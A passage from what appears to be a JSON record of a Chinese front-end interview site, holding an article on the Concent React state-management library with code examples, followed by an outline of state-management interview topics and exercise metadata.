实例提交新状态时第一步定位到所属模块下的所有`ccClassKey`列表，\n* 2 遍历列表读取并分析`ccClassContext`对象，结合其`watchedKeys`条件约束，尝试将提交的`sharedState`通过`watchedKeys`进一步提取出符合当前类实例更新条件的状态`extractedState`，如果提取出为空，就不更新，反之则将其`refs`列表下的实例`ctx`引用遍历，将`extractedState`发送给对应的`reactSetState`入口，触发它们的视图渲染更新。\n\n![工作原理](https://static.ecool.fun//article/4019a1f6-bbfc-4e22-a5ca-d5cadc91e186.png)\n\n工作原理\n\n#### 解耦ui和业务\n\n有如开篇的我们为什么需要状态管理里提到的，状态的变更逻辑背后其实就是我们的业务逻辑，将其抽离出来能够彻底**解耦ui和业务**，有利于逻辑复用，以及持续的维护和迭代。\n\n所以我们漫天使用`setState`怼业务逻辑，业务代码和渲染代码交织在一起必然造成我们的组件越来越臃肿，且不利于逻辑复用，但是**很多时候功能边界的划分和模块的数据模型建立并不是一开始能够定义的清清楚楚明明白白的，是在不停的迭代过程中反复抽象逐渐沉淀下来的**。\n\n所以`concent`允许这样多种开发模式存在，可以自上而下的一开始按模块按功能规划好store的reducer，然后逐步编码实现相关组件，也可以自下而上的开发和迭代，在需求或者功能不明确时，就先不抽象reducer，只是把业务写在组件里，然后逐抽离他们，也不用强求中心化的配置模块store，而是可以自由的去中心化配置模块store，再根据后续迭代计划轻松的调整store的配置。\n\n新增reducer定义\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nimport { run } from 'concent';\nrun({\n  counter: {//定义counter模块\n    state: { count: 1 },//state定义，必需\n    reducer: {//reducer函数定义，可选\n      inc(payload, moduleState) {\n        return { count: moduleState.count + 1 }\n      },\n      dec(payload, moduleState) {\n        return { count: moduleState.count - 1 }\n      }\n    },\n  },\n})\n```\n\n通过dispatch修改状态\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nimport { register } from 'concent';\n//注册成为Concent Class组件，指定其属于counter模块\n@register('counter')\nclass CounterComp extends Component {\n  render() {\n    //ctx是concent为所有组件注入的上下文对象，携带为react组件提供的各种新特性api\n    return (\n      <div>\n        count: {this.state.count}\n        <button onClick={() => this.ctx.dispatch('inc')}>inc</button>\n        <button onClick={() => this.ctx.dispatch('dec')}>dec</button>\n      </div>\n    );\n  }\n}\n```\n\n因为concent的模块除了state、reducer，还有watch、computed和init 这些可选项，支持你按需定义。\n\n![cc-modulepng](https://static.ecool.fun//article/cbe59395-00f8-4371-8074-201f2c4aedc5.png)\n\ncc-modulepng\n\n所以不管是全局消费的`business model`、还是组件或者页面自己维护的`component model`和`page model`，都推荐进一步将model写为文件夹，在内部定义state、reducer、computed、watch、init，再导出合成在一起组成一个完整的model定义。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nsrc\n├─ ...\n└─ page\n│  ├─ login\n│  │  ├─ model //写为文件夹\n│  │  │  ├─ state.js\n│  │  │  ├─ reducer.js\n│  │  │  ├─ computed.js\n│  │  │  ├─ watch.js\n│  │  │  ├─ init.js\n│  │  │  └─ index.js\n│  │  └─ Login.js\n│  └─ product ...\n│\n└─ component\n   └─ ConfirmDialog\n      ├─ model\n      └─ index.js\n```\n\n这样不仅显得各自的职责分明，防止代码膨胀变成一个巨大的model对象，同时reducer独立定义后，内部函数相互dispatch调用时可以**直接基于引用**而非字符串了。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n// code in models/foo/reducer.js\nexport function changeName(name) {\n  return { name };\n}\n\nexport async function  changeNameAsync(name) {\n  await api.track(name);\n  return { name };\n}\n\nexport async function changeNameCompose(name, moduleState, actionCtx) {\n  await actionCtx.setState({ loading: true });\n  await actionCtx.dispatch(changeNameAsync, name);//基于函数引用调用\n  return { loading: false };\n}\n```\n\n### 高性能\n\n现有的状态管理方案，大家在性能的提高方向上，都是基于缩小渲染范围来处理，做到只渲染该渲染的区域，对react应用性能的提升就能产生不少帮助，同时也避免了人为的去写`shouldComponentUpdate`函数。\n\n那么对比`redux`，因为支持key级别的消费粒度控制，从状态提交那一刻起就知道更新哪些实例，所以性能上能够给你足够的保证的，特别是对于组件巨多，数据模型复杂的场景，`cocent`一定能给你足够的信心去从容应对，我们来看看对比`mbox`，`concent`做了哪些更多场景的探索。\n\n#### renderKey，更精确的渲染范围控制\n\n每一个组件的实例上下文`ctx`都有一个唯一索引与之对应，称之为`ccUniqueKey`，每一个组件在其实例化的时候如果不显示的传入`renderKey`来重写的话，其`renderKey`默认值就是`ccUniqueKey`，当我们遇到模块的某个stateKey是一个列表或者map时，遍历它生产的视图里各个子项调用了同样的`reducer`，通过id来达到只修改自己数据的目的，但是他们共享的是一个`stateKey`，所以必然观察这个`stateKey`的其他子项也会被触发冗余渲染，而我们期望的结果是：谁修改了自己的数据，就只触发渲染谁。\n\n如store的list是一个长列表，每一个item都会渲染成一个ItemView，每一个ItemView都走同一个reducer函数修改自己的数据，但是我们期望修改完后只能渲染自己，从而做到**更精确的渲染范围控制**。\n\n![render-key.png](https://static.ecool.fun//article/45e052cd-ccf4-4d7d-bb88-ce552da5013e.png)\n\nrender-key.png\n\n基于`renderKey`机制，`concent`可以轻松办到这一点，当你在状态派发入口处标记了`renderKey`时，`concent`会直接命中此`renderKey`对应的实例去触发渲染更新。\n\n> 无论是`setState`、`dispatch`，还是`invoke`，都支持传入`renderKey`。\n\n![render-key](https://static.ecool.fun//article/ea6c8ed4-e901-4981-a5da-bd636856db09.gif)\n\nrender-key\n\n[查看在线示例代码](/developer/tools/blog-entry?target=https%3A%2F%2Fstackblitz.com%2Fedit%2Fconcent-render-key%3Ffile%3DBookItem.js&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n// 以下是来自于concent实现的伪代码示意\n\n// store的一个子模块描述\n{\n  subModuleFoo: {\n    state: {\n      list: [\n        { name: 'xx', age: 19 },\n        { name: 'xx', age: 19 }\n      ],\n      bookId_book_: { ... },//map from bookId to book\n    },\n    reducer: {\n      changeName(payload, moduleState) {\n        const { id, name } = payload;\n        const bookId_book_ = moduleState.bookId_book_;\n        const book = bookId_book_[id];\n        book.name = name;//change name\n\n        //只是修改了一本书的数据\n        return { bookId_book_ };\n      }\n    }\n  }\n}\n\nclass ItemView extends Component {\n  changeName = (e)=>{\n    this.props.dispatch('changeName', e.currentTarget.value);\n  }\n  changeNameFast = (e)=>{\n    // 每一个cc实例拥有一个ccUniqueKey\n    const ccUniqueKey = this.ctx.ccUniqueKey;\n    // 当我修改名称时，真的只需要刷新我自己\n    this.props.dispatch('changeName', e.currentTarget.value, ccUniqueKey);\n  }\n  render() {\n    const book = this.state.bookId_book_[this.props.id];\n    //尽管我消费是subModuleFoo的bookId_book_数据，可是通过id来让我只消费的是list下的一个子项\n\n    //替换changeName 为 changeNameFast达到我们的目的\n    return <input value={ book.name } onChange = { changeName } />\n  }\n}\n\nclass BookItemContainer extends Component {\n  render() {\n    const books = this.state.list;\n    return (\n      <div>\n        {/** 遍历生成ItemView */}\n        {books.map((v, idx) => <ItemView key={v.id} id={v.id} />)}\n      </div >\n    )\n  }\n}\n```\n\n#### lazyDispatch，更细粒度的渲染次数控制\n\n在`concent`里，`reducer`函数和`setState`一样，提倡改变了什么就返回什么，且书写格式是多样的。\n\n* 可以是普通的纯函数\n* 可以是`generator`生成器函数\n* 可以是`async & await`函数\n  可以返回一个部分状态，可以调用其他reducer函数后再返回一个部分状态，也可以啥都不返回，只是组合其他reducer函数来调用。对比`redux`或者`redux`家族的方案，总是合成一个新的状态是不是要省事很多，且纯函数和副作用函数不再区别对待的定义在不同的地方，仅仅是函数声明上做文章就可以了，你想要纯函数，就声明为普通函数，你想要副作用函数，就声明为异步函数，简单明了，符合阅读思维。\n\n基于此机制，我们的reducer函数粒度拆得很细很原子，每一个都负责独立更新某一个和某几个key的值，以便更灵活的组合它们来完成高度复用的目的，让代码结构上变优雅，让每一个reducer函数的职责更得更小。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n//reducer fns\nexport async function updateAge(id){\n  // ....\n  return {age: 100};\n}\n\nexport async function trackUpdate(id){\n  // ....\n  return {trackResult: {}};\n}\n\nexport async function fetchStatData(id){\n  // ....\n  return {statData: {}};\n}\n\n// compose other reducer fns\nexport async function complexUpdate(id, moduleState, actionCtx) {\n  await actionCtx.dispatch(updateAge, id);\n  await actionCtx.dispatch(trackUpdate, id);\n  await actionCtx.dispatch(fetchStatData, id);\n}\n```\n\n虽然代码结构上变优雅了，每一个reducer函数的职责更小了，但是其实每一个reducer函数其实都会触发一次更新。\n\n> reducer函数的源头触发是从实例上下文ctx.dispatch或者全局上下文cc.dispatch（or cc.reducer）开始的，呼叫某个模块的某个reducer函数，然后在其reducer函数内部再触发的其他reducer函数的话，其实已经形成了一个**调用链**，链路上的每一个返回了状态值的reducer函数都会触发一次渲染更新，如果链式上有很多reducer函数，会照常很多次对同一个视图的冗余更新。\n\n触发reducer的源头代码\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n// in your view\n<button onClick={()=> ctx.dispatch('complexUpdate', 2)}>复杂的更新</button>\n```\n\n更新流程如下所示\n\n![dispatch.png](https://static.ecool.fun//article/0f8fd359-7510-4093-b5eb-83a9924957a7.png)\n\ndispatch.png\n\n针对这种调用链提供lazy特性，以便让用户既能满意的把reducer函数更新状态的粒度拆分得很细，又保证渲染次数缩小到最低。\n\n> 看到此特性，`mbox`使用者是不是想到了`transaction`的概念，是的你的理解没错，某种程度上它们所到到的目的是一样的，但是在concent里使用起来更加简单和优雅。\n\n现在你只需要将触发源头做小小的修改，用`lazyDispatch`替换掉`dispatch`就可以了，reducer里的代码不用做任何调整，concent将延迟reducer函数调用链上所有reducer函数触发ui更新的时机，仅将他们返回的新部分状态按模块分类合并后暂存起来，最后的源头函数调用结束时才一次性的提交到store并触发相关实例渲染。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n// in your view\n<button onClick={()=> ctx.lazyDispatch('complexUpdate', 2)}>复杂的更新</button>\n```\n\n![lazy-dispatch](https://static.ecool.fun//article/6f325cde-f38d-46e7-9b65-4769ebfbe137.gif)\n\nlazy-dispatch\n\n[查看在线示例代码](/developer/tools/blog-entry?target=https%3A%2F%2Fstackblitz.com%2Fedit%2Fconcent-lazy-dispatch%3Ffile%3DBookItem.js&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n现在新的更新流程如下图\n\n![image.png](https://static.ecool.fun//article/c577b266-f989-45cb-b10b-13935a3e5cc3.png)\n\nimage.png\n\n当然lazyScope也是可以自定义的，不一定非要在源头函数上就开始启用lazy特性。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n// in your view\nconst a=  <button onClick={()=> ctx.dispatch('complexUpdateWithLoading', 2)}>复杂的更新</button>\n\n// in your reducer\nexport async function complexUpdateWithLoading(id, moduleState, actionCtx) {\n  //这里会实时的触发更新\n  await actionCtx.setState({ loading: true });\n\n  //从这里开始启用lazy特性，complexUpdate函数结束前，其内部的调用链都不会触发更新\n  await actionCtx.lazyDispatch(complexUpdate, id);\n\n  //这里返回了一个新的部分状态，也会实时的触发更新\n  return { loading: false };\n}\n```\n\n#### delayBroadcast，更主动的降低渲染次数频率\n\n针对一些共享状态，当某个实例高频率的改变它的时候，使用`delayBroadcast`主动的控制此状态延迟的分发到其它实例上，从而实现**更主动的降低渲染次数频率**\n\n![delay](https://static.ecool.fun//article/01f50788-ae6d-4465-ace9-d1e994a2422f.gif)\n\ndelay\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nfunction ImputComp() {\n  const ctx = useConcent('foo');\n  const { name } = ctx.state;\n  const changeName = e=> ctx.setState({name: e.currentTarget.value});\n  //setState第四位参数是延迟分发时间\n  const changeNameDelay = e=> ctx.setState({name: e.currentTarget.value}, null, null, 1000);\n  return (\n    <div>\n      <input  value={name} onChange={changeName} />\n      <input  value={name} onChange={changeName} />\n    </div>\n  );\n}\n\nfunction App(){\n  return (\n    <>\n      <ImputComp />\n      <ImputComp />\n      <ImputComp />\n    </>\n  );\n}\n```\n\n[查看在线示例代码](/developer/tools/blog-entry?target=https%3A%2F%2Fstackblitz.com%2Fedit%2Fconcent-delay-broadcast%3Ffile%3DInputComp1.js&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n### 增强react\n\n前面我们提到的`ctx`对象，是增强react的“功臣”，因为每个实例上都有一个`concent`为之构造的`ctx`对象，在它之下新增很多新功能、新特性就很方便了。\n\n#### 新特性加入\n\n如上面关于模块提到了`computed`、`watch`等关键词，读到它们的读者，一定留了一些疑问吧，其实它们出现的动机和使用体验是和`vue`的一样的。\n\n* `computed`定义各个`stateKey`的值发生变化时，要触发的计算函数，并将其结果缓存起来，仅当`stateKey`的值再次变化时，才会触发计。[了解更多关于computed](/developer/tools/blog-entry?target=https%3A%2F%2Fconcentjs.github.io%2Fconcent-doc%2Fguide%2Fconcept-module-computed&objectId=1516577&objectType=1&isNewArticle=undefined)\n* `watch`定义各个`stateKey`的值发生变化时，要触发的回调函数，仅当`stateKey`的值再次变化时，才会触发，通常用于一些异步的任务处理。[了解更多关于watch](/developer/tools/blog-entry?target=https%3A%2F%2Fconcentjs.github.io%2Fconcent-doc%2Fguide%2Fconcept-module-watch&objectId=1516577&objectType=1&isNewArticle=undefined)。\n  我如果从`setState`的本质来解释，你就能够明白这些功能其实自然而然的就提供给用户使用了。\n\n`setState`传入的参数是`partialState`，所以`concent`一开始就知道是哪些`stateKey`发生了变化，自然而然我们只需要暴露一个配置`computed`、`watch`的地方，那么当实例提交新的部分状态时，增强后`setState`就自然能够去触发相关回调了。\n\n![enhance set state.png](https://static.ecool.fun//article/031705f5-0963-40b1-bfa4-dfe213db6a91.png)\n\nenhance set state.png\n\n#### setup赋予组件更多能力\n\n上面提到的`computed`、`watch`值针对模块的，我们需要针对实例单独定制`computed`、`watch`的话该怎么处理呢？\n\nsetup是针对组件实例提供的一个非常重要的特性，在类组件和函数组件里都能够被使用，它会在组件首次渲染之前会被触发执行一次，其返回结果收集在`ctx.settings`里，之后便不会再被执行，所以可以在其中定义实例computed、实例watch、实例effect等钩子函数，同时也可以自定义其他的业务逻辑函数并返回，方便组件使用。\n\n基于setup执行时机的特点，相当于给了组件一个额外的空间，一次性的为组件定义好相关的个性化配置，赋予组件更多的能力，特别是对于函数组件，提供`useConcent`来复制了`register`接口的所有能力，其返回结果收集在`ctx.settings`里的特点让函数组件能够将所有方法一次性的定义在`setup`里，从而避免了在函数组件重复渲染期间反复生成临时闭包函数的弱点，减少gc的压力。\n\n> 使用`useConcent`只是为了让你还是用经典的`dispatch&&reducer`模式来书写核心业务逻辑，并不排斥和其他工具钩子函数（如`useWindowSize`等）一起混合使用。\n\n让我们`setup`吧！！！看看setup带来的魔力，其中`effect`钩子函数完美替代了`useEffect`。[了解更多关于setup](/developer/tools/blog-entry?target=https%3A%2F%2Fconcentjs.github.io%2Fconcent-doc%2Fguide%2Fconcept-ref-setup&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nconst setup = ctx => {\n  //count变化时的副作用函数，第二位参数可以传递多个值，表示任意一个发生变化都将触发此副作用\n  ctx.effect(() => {\n    console.log('count changed');\n  }, ['count']);\n  //每一轮渲染都会执行\n  ctx.effect(() => {\n    console.log('trigger every render');\n  });\n  //仅首次渲染执行的副作用函数\n  ctx.effect(() => {\n    console.log('trigger only first render');\n  }, []);\n\n  //定义实例computed，因每个实例都可能会触发，优先考虑模块computed\n  ctx.computed('count', (newVal, oldVal, fnCtx)=>{\n    return newVal*2;\n  });\n\n //定义实例watch，区别于effect，执行时机是在组件渲染之前\n //因每个实例都可能会触发，优先考虑模块watch\n  ctx.watch('count', (newVal, oldVal, fnCtx)=>{\n    //发射事件\n    ctx.emit('countChanged', newVal);\n    api.track(`count changed to ${newVal}`);\n  });\n\n  //定义事件监听，concent会在实例销毁后自动将其off掉\n  ctx.on('changeCount', count=>{\n    ctx.setState({count});\n  });\n\n  return {\n    inc: () => setCount({ count: ctx.state.count + 1 }),\n    dec: () => setCount({ count: ctx.state.count - 1 }),\n  };\n}\n```\n\n得益于`setup`特性和所有concent实例都持有上线文对象`ctx`，类组件和函数组件将实现100%的api调用能力统一，这就意味着两者编码风格高度一致，相互转换代价为0。\n\n接入setup的函数组件\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nimport { useConcent } from 'concent';\n\nfunction HooklFnComp() {\n  //setup只会在初次渲染前调用一次\n  const ctx = useConcent({ setup, module:'foo' });\n  const { state , settings: { inc, dec }  } = ctx;\n\n  return (\n    <div>\n      count: {state.count}\n      <button onClick={inc}>+</button>\n      <button onClick={dec}>-</button>\n    </div>\n  );\n}\n```\n\n接入setup的类组件\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n@register('foo')\nclass ClassComp extends React.Component() {\n  $$setup(ctx){\n    //复用刚才的setup定义函数, 这里记得将结果返回\n    return setup(ctx);\n  }\n\n  render(){\n    const ctx = this.ctx;\n    //ctx.state 等同于 this.state\n    const { state , settings: { inc, dec }  } = ctx;\n\n    return (\n      <div>\n        count: {state.count}\n        <button onClick={inc}>+</button>\n        <button onClick={dec}>-</button>\n      </div>\n    );\n  }\n\n}\n```\n\n[查看在线示例代码](/developer/tools/blog-entry?target=https%3A%2F%2Fstackblitz.com%2Fedit%2Fhook-setup%3Ffile%3DCounterSetupComputedWatch.js&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n能力得到增强后，可以自由的按场景挑选合适的方式更新状态\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n@register(\"foo\")\nclass HocClassComp extends Component {\n  render() {\n    const { greeting } = this.state; // or this.ctx.state\n    const {invoke, sync, set, dispatch} = this.ctx;\n\n    // dispatch will find reducer method to change state\n    const changeByDispatch = e => dispatch(\"changeGreeting\", evValue(e));\n    // invoke cutomized method to change state\n    const changeByInvoke = e => invoke(changeGreeting, evValue(e));\n    // classical way to change state, this.setState equals this.ctx.setState\n    const changeBySetState = e => this.setState({ greeting: evValue(e) });\n    // make a method to extract event value automatically\n    const changeBySync = sync('greeting');\n    // similar to setState by give path and value\n    const changeBySet = e=> set('greeting', evValue(e));\n\n    return (\n      <>\n        <h1>{greeting}</h1>\n        <input value={greeting} onChange={changeByDispatch} /><br />\n        <input value={greeting} onChange={changeByInvoke} /><br />\n        <input value={greeting} onChange={changeBySetState} /><br />\n        <input value={greeting} onChange={changeBySync} /><br />\n        <input value={greeting} onChange={changeBySet} />\n      </>\n    );\n  }\n}\n```\n\n[查看在线示例代码](/developer/tools/blog-entry?target=https%3A%2F%2Fstackblitz.com%2Fedit%2Fconcent-doc-home-demo&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n下图是一个完整的concent组件生命周期示意图：\n\n![ins.png](https://static.ecool.fun//article/3745c301-8197-4048-bf69-78503e3ea5a6.png)\n\nins.png\n\n#### 支持中间件与插件\n\n一个好的框架应该是需要提供一些可插拔其他库的机制来弹性的扩展额外能力的，这样有利于用户额外的定制一些个性化需求，从而促进框架周边的生态发展，所以一开始设计concent，就保留了中间件与插件机制，允许定义中间件拦截所有的数据变更提交记录做额外处理，也支持自定义插件接收运行时的各种信号，增强concent能力。\n\n![image.png](https://static.ecool.fun//article/98719605-2fc2-471a-8544-7f09fefca6b2.png)\n\nimage.png\n\n定义中间件并使用\n\n> 一个中间就是一个普通函数\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nimport { run } from 'concent';\nconst myMiddleware = (stateInfo, next)=>{\n  console.log(stateInfo);\n  next();//next一定不能忘记\n}\n\nrun(\n  {...}, //store config\n  {\n    middlewares: [ myMiddleware ]\n  }\n);\n```\n\n定义插件并使用\n\n> 一个插件就是一个必需包含install方法的普通对象\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nimport { cst, run } from 'concent';\n\nconst myPlugin = {\n  install: ( on )=>{\n    //监听来自concent运行时的各种信号，并做个性化处理\n    on(cst.SIG_FN_START, (data)=>{\n      const { payload, sig } = data;\n      //code here\n    })\n  }\n\n  return { name: 'myPlugin' }//必需返回插件名\n}\n```\n\n现基于插件机制已提供如下插件\n\n* [concent-plugin-loading](/developer/tools/blog-entry?target=https%3A%2F%2Fgithub.com%2Fconcentjs%2Fconcent-plugin-loading&objectId=1516577&objectType=1&isNewArticle=undefined)，一个轻松控制concent应用loading状态的插件\n* [concent-plugin-redux-devtool](/developer/tools/blog-entry?target=https%3A%2F%2Fgithub.com%2Fconcentjs%2Fconcent-plugin-redux-devtool&objectId=1516577&objectType=1&isNewArticle=undefined)，让concent应用接入redux-dev-tool调试工具，方便清晰的追溯状态变更历史。\n\n![image.png](https://static.ecool.fun//article/77737942-2e53-4ce7-ae6b-8f9676716504.png)\n\nimage.png\n\n#### 拥抱现有的react生态\n\n当然`concent`不会去造无意义的轮子，依然坚持拥抱现有的react生态的各种优秀资源，如提供的[react-router-concent](/developer/tools/blog-entry?target=https%3A%2F%2Fgithub.com%2Fconcentjs%2Freact-router-concent&objectId=1516577&objectType=1&isNewArticle=undefined)，桥接了`react-router`将其适配到concent应用里。\n\n全局暴露`history`对象，享受编程式的导航跳转。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nimport React, { Component } from 'react'\nimport ReactDOM from 'react-dom'\nimport { BrowserRouter, Switch, Route } from 'react-router-dom';\nimport { ConnectRouter, history, Link } from 'react-router-concent';\nimport { run, register } from 'concent';\n\nrun();\n\nclass Layout extends Component {\n  render() {\n    console.log('Layout Layout');\n    return (\n      <div>\n        <div onClick={() => history.push('/user')}>go to user page</div>\n        <div onClick={() => history.push('/user/55')}>go to userDetail page</div>\n        {/** 可以基于history主动push，也可以使用Link */}\n        <Link to=\"/user\" onClick={to => alert(to)}>to user</Link>\n        <div onClick={() => history.push('/wow')}>fragment</div>\n        <Route path=\"/user\" component={User_} />\n        <Route path=\"/user/:id\" component={UserDetail_} />\n        <Route path=\"/wow\" component={F} />\n      </div>\n    )\n  }\n}\n\nconst App = () => (\n  <BrowserRouter>\n    <div id=\"app-root-node\">\n      <ConnectRouter />\n      <Route path=\"/\" component={Layout} />\n    </div>\n  </BrowserRouter>\n)\nReactDOM.render(<App />, document.getElementById('root'));\n```\n\n[点我查看在线示例](/developer/tools/blog-entry?target=https%3A%2F%2Fstackblitz.com%2Fedit%2Fcc-react-router-concent%3Ffile%3Dindex.js&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n## 结语&思考\n\n`concent`的工作机制核心是**依赖标记**、**引用收集**、**状态分发**，通过构建全局上下文和实例上下文，并让两者之间产生互动来实现状态管理的诉求，并进一步的实现组件能力增强。\n\n理论上基于此原理，可以为其他同样基于`pull based`更新机制的ui框架实现状态管理，并让他们保持一致的api调用能力和代码书写风格，如`小程序`的`this.setData`，`omi`的`this.update`。\n\n同时因为`concent`提供了实例上下文对象`ctx`来升级组件能力，所以如果我们提出一个目标：可以让`响应式`和`不可变`共存，看起来是可行的，只需要再附加一个和`state`对等的可观察对象在`ctx`上，假设`this.ctx.data`就是我们构建的可观察对象，然后所提到的`响应式`需要做到针对不同平台按不同策略处理，就能达到共存的目的了。\n\n* 针对本身就是`响应式`的框架如`angualr`和`vue`，提供`this.ctx.data`去直接修改状态相当于桥接原有的更新机制，而`reducer`返回的状态最终还是落到`this.ctx.data`去修改来驱动视图渲染。\n* 针对`pull based`的框架如`react`，提供`this.ctx.data`只是一种伪的响应式，在`this.ctx.data`收集到的变更最终还是落到`this.setState`去驱动视图更新，但是的确让用户使用起来觉得是直接操作了数据就驱动了视图的错觉。\n  所以如果实现了这一层的统一，是不是`concent`可以用同样的编码方式去书写所有ui框架了呢？\n\n当然，大一统的愿望是美好的，可是真的需要将其实现吗？各框架里的状态管理方案都已经很成熟，个人有限的精力去做实现这份愿景必然又是选择了一条最最艰辛的路，所以这里只是写出一份个人对让`响应式`和`不可变`共存的的思考整理，给各位读者提供一些参考意见去思考状态管理和ui框架之间的发展走向。\n",
    "testPoint": "## 一、核心认知层：状态管理的本质与分类\n\n**考察重点：**\n\n* 能否清楚区分：\n\n  * **UI 状态**（组件内部状态）\n  * **全局业务状态**（用户信息、权限、配置等）\n  * **服务端状态**（接口数据缓存）\n* 是否理解状态管理的本质是：**数据可控、流向清晰、可预测**\n* 能否明确“为什么需要状态管理库”：组件通信复杂、状态共享困难、数据一致性难维护。\n\n**典型问题：**\n\n* 什么情况下需要引入状态管理库？\n* 状态应该放在全局还是组件内？怎么判断？\n* 你如何定义“状态管理工程化”？\n\n---\n\n## 二、数据流设计与架构思想\n\n**考察重点：**\n\n* **单向数据流（React 思想）**与**响应式数据流（Vue 思想）**\n* 状态变化的可追踪性（Action → Reducer → State → View）\n* 数据分层结构设计：\n\n  * 页面局部状态（useState / reactive）\n  * 模块级状态（Feature Store）\n  * 全局状态（App Store）\n  * 远程状态（API cache、RTK Query、React Query）\n* 是否具备清晰的层次划分和数据流动规范。\n\n**典型问题：**\n\n* 单向数据流与双向绑定的区别？\n* 你的项目中，状态是如何分层管理的？\n* 如何让状态变化具有可追踪性？\n\n---\n\n## 三、状态存储与访问模式\n\n**考察重点：**\n\n* 常见状态管理方案的原理对比：\n\n  * Redux / Redux Toolkit（函数式 + 可预测）\n  * Zustand / Jotai / Recoil（轻量、hooks 驱动）\n  * Vuex / Pinia（响应式代理）\n  * RxJS（响应式流）\n* **状态访问模式：**\n\n  * 直接访问 vs 派生状态（selector / computed）\n  * 共享状态 vs 独立实例状态\n* **不可变数据（Immutable）**的重要性与性能影响\n\n**典型问题：**\n\n* Redux 为什么要求 state 不可变？\n* Vuex 的数据是如何实现响应式的？\n* Zustand 是如何做到轻量化与性能优化的？\n\n---\n\n## 四、状态同步与持久化\n\n**考察重点：**\n\n* 多页面或多标签页同步（BroadcastChannel / localStorage 事件）\n* 状态持久化方案（localStorage、IndexedDB、redux-persist、pinia-plugin-persist）\n* 登录状态、主题配置等长期状态的存储策略\n* 状态恢复与版本迁移（如持久化 schema 变化）\n\n**典型问题：**\n\n* 如何让多个标签页共享状态？\n* 你在项目中如何做状态持久化？\n* 状态持久化后 schema 变化怎么处理？\n\n---\n\n## 五、性能优化与渲染控制\n\n**考察重点：**\n\n* 大型项目状态更新频繁导致的性能问题\n* React 中：\n\n  * 拆分 store / 使用 selector / memo 优化\n  * React 18 并发更新与状态切片思想\n* Vue 中：\n\n  * 响应式细粒度更新、computed 缓存\n  * 拆 store 模块、按需订阅\n* 异步状态与请求缓存（React Query、SWR）\n\n**典型问题：**\n\n* 状态变化导致整页重渲染的原因是什么？\n* Redux 中如何避免不必要的组件重渲染？\n* Vuex 状态更新为什么有时不会触发视图更新？\n\n---\n\n## 六、状态与接口请求（服务端状态）\n\n**考察重点：**\n\n* 服务端状态与客户端状态的边界\n* 数据获取策略：\n\n  * SWR（stale-while-revalidate）\n  * 缓存 + 失效 + 重新验证\n* React Query / RTK Query 在工程化体系中的角色\n* 接口层抽象：API 模块 vs 状态同步 vs 缓存层\n* 异步状态管理与错误边界\n\n**典型问题：**\n\n* React Query 与 Redux 的职责区别？\n* 你如何设计数据请求与全局状态的关系？\n* 如何统一管理接口缓存和失效？\n\n---\n\n## 七、工程化规范与团队协作\n\n**考察重点：**\n\n* 状态模块划分规范（以功能或领域为单位）\n* store 目录结构设计（modules、actions、selectors、hooks）\n* 类型定义与接口约束（TypeScript 类型安全）\n* 状态命名规范与依赖解耦\n* 状态管理与组件的依赖隔离（useStore hooks 封装）\n\n**典型问题：**\n\n* 你们项目的状态目录结构是怎样设计的？\n* 如何让团队成员不随意修改全局状态？\n* 如何确保多人协作下状态命名和逻辑一致？\n\n---\n\n## 八、可观测性与调试能力\n\n**考察重点：**\n\n* 状态变化的可追踪性（Redux DevTools、Pinia DevTools）\n* 日志与快照记录（time-travel debugging）\n* 状态异常监控与错误边界\n* 状态版本比对、数据校验机制\n\n**典型问题：**\n\n* Redux DevTools 的原理是什么？\n* 如何调试复杂状态的变化链路？\n* 状态出现异常时如何快速定位？\n\n---\n\n## 九、扩展与高级考察方向\n\n**考察重点：**\n\n* **跨应用状态共享**（微前端、模块联邦）\n* **离线状态管理**（PWA、IndexedDB）\n* **多端统一状态体系**（Web + RN + Electron）\n* **Server Component 与客户端状态融合（React 18+）**\n\n**典型问题：**\n\n* 微前端下如何共享全局状态？\n* React Server Component 会改变状态管理方式吗？\n* PWA 离线缓存状态怎么同步？\n\n",
    "exerciseKeyList": "[\"746d796e-fd0c-44c7-b38f-00296bdfdde9\",\"10e0441f-d709-427d-975b-f0026556ae7e\",\"453b0ac6-f8a2-44ed-af3f-eda8eaa0a70d\",\"5a06e08f-c274-45c4-af4e-4281e1faea86\",\"14bf5712-b28f-41a0-852f-af40a342afde\",\"c00d61b8-2609-40b9-8deb-a4fdb686e7c7\",\"2476ee50-e484-4416-88a7-4c506f84de9a\",\"48ea6174-729d-4d41-ab63-eeaa3781068b\",\"5c4ea1e0-f1e4-4710-a5dd-e51277c83d9c\",\"89865bbd-72ac-4866-b4f6-a24f9c594d07\",\"025473a3-19c3-4398-94ab-c3d72002dcce\",\"5438d05b-ec3b-42f6-8819-1f73213d654b\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T03:27:03.000Z",
    "updateAt": "2025-10-23T08:55:30.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "025473a3-19c3-4398-94ab-c3d72002dcce",
        "title": "说说对Redux中间件的理解？常用的中间件有哪些？实现原理？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:27:03.000Z",
        "updateAt": "2024-08-10T17:05:54.000Z"
      },
      {
